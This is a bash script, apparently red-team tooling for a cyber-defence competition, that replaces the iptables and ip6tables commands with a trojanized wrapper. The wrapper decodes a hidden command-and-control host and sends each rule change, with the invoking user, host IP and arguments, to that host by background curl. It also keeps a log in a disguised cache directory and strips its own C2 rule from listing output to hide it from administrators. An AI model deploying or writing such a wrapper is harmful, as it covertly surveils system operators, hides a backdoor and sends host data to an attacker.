#!/bin/bash
if [[ "$0" == *"ip6tables"* ]]; then
    REAL_IPTABLES="/usr/sbin/ip6tables"
else
    REAL_IPTABLES="/usr/sbin/iptables"
fi

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_IPTABLES "$@" ;;
esac

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)

HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
COMMAND_ARGS="$*"

MUTATING=0
for arg in "$@"; do
    case "$arg" in
        -A|-I|-D|-R|-F|-X|-P|-Z) MUTATING=1; break ;;
        --append|--insert|--delete|--replace|--flush|--delete-chain|--policy|--zero)
            MUTATING=1; break ;;
    esac
done

# For list/check operations, run and filter our rule from output
IS_LIST=0
for arg in "$@"; do
    case "$arg" in
        -L|--list|-S|--list-rules|-n|--numeric) IS_LIST=1 ;;
    esac
done

if [ "$IS_LIST" -eq 1 ]; then
    $REAL_IPTABLES "$@" 2>&1 | grep -v "$C2_HOST"
    exit ${PIPESTATUS[0]}
fi

$REAL_IPTABLES "$@"
RC=$?

if [ "$MUTATING" -eq 1 ]; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"iptables","timestamp":"%s","data":{"args":"%s","exit_code":%d}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$COMMAND_ARGS" "$RC")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|iptables|${INVOKING_USER}|${COMMAND_ARGS}|rc:${RC}"
fi

exit $RC
